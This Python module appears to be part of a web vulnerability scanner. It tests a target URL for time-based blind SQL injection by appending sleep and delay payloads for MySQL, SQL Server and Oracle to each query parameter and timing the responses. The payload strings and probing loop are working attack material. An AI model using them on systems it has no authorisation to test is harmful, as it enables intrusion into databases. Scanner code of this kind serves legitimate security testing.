from app.scan.self.vul.sqlinjection import CheckWaf
import time
import requests


def TimeIn(domain,queries,old_html):
    sql_times = {
        "MySQL": (r" and sleep(5)", r"' and sleep(5) and '8590'='8590", r'''" and sleep(5) and "8590"="8590'''),
        "Microsoft SQL Server": (r" waitfor delay '0:0:5'--+", r"' waitfor delay '0:0:5'--+", r'''" waitfor delay '0:0:5'--+'''),
        "Oracle": (r" and 1= dbms_pipe.receive_message('RDS', 5)--+", r"' and 1= dbms_pipe.receive_message('RDS', 5)--+", r'''"  and 1= dbms_pipe.receive_message('RDS', 5)--+''')
        }
    for db,timepayloads in sql_times.items():
        for payload in timepayloads:
            website = domain + "?" + ("&".join([param + payload for param in queries]))
            try:
                start_time = time.time()
                rep1=requests.get(domain)
                end_time_1 = time.time()
                rep2=requests.get(website)
                end_time_2 = time.time()
                delta1 = end_time_1 - start_time
                delta2 = end_time_2 - end_time_1
                if (delta2 - delta1) > 4:
                    return True,website,db+"\n"+rep2.text
                elif CheckWaf.CheckHaveWaf(old_html, rep1.text):
                    return False,website,"waf"
            except:
                pass
    return False,None,None

